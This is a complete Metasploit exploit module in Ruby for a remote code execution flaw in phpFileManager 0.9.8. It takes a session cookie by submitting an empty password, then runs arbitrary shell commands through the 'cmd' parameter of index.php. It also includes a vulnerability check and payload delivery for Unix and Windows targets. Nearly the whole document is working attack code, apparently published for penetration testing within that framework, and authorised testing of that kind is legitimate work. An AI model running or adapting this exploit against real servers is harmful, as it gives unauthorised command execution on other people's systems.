# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;phpFileManager 0.9.8 Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
         This module exploits a remote code execution vulnerability in phpFileManager
         0.9.8 which is a filesystem management tool on a single file.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;hyp3rlinx&#039;, # initial discovery
          &#039;Jay Turla&#039; # msf
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;37709&#039; ],
          [ &#039;URL&#039;, &#039;http://phpfm.sourceforge.net/&#039; ] # Official Website
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 2000,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Platform&#039;       => %w{ unix win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;phpFileManager / Unix&#039;, { &#039;Platform&#039; => &#039;unix&#039; } ],
          [&#039;phpFileManager / Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 28 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of phpFileManager&#039;, &#039;/phpFileManager-0.9.8/index.php&#039;]),
      ],self.class)
  end
 
  def check
    txt = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo #{txt}")
 
    if res && res.body =~ /#{txt}/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def push
    uri = normalize_uri(target_uri.path)
 
    # To push the Enter button
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => uri,
      &#039;vars_post&#039; => {
        &#039;frame&#039; => &#039;3&#039;,
        &#039;pass&#039;  => &#039;&#039; # yep this should be empty
       }
    })
 
    if res.nil?
      vprint_error("#{peer} - Connection timed out")
      fail_with(Failure::Unknown, "Failed to trigger the Enter button")
    end
 
    if res && res.headers && res.code == 302
      print_good("#{peer} - Logged in to the file manager")
      cookie = res.get_cookies
      cookie
    else
      fail_with(Failure::Unknown, "#{peer} - Error entering the file manager")
    end
  end
 
  def http_send_command(cmd)
    cookie = push
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path),
      &#039;cookie&#039;   => cookie,
      &#039;vars_get&#039; => {
        &#039;action&#039; => &#039;6&#039;,
        &#039;cmd&#039; => cmd
      }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, "Failed to execute the command.")
    end
    res
  end
 
  def exploit
    http_send_command(payload.encoded)
  end
end

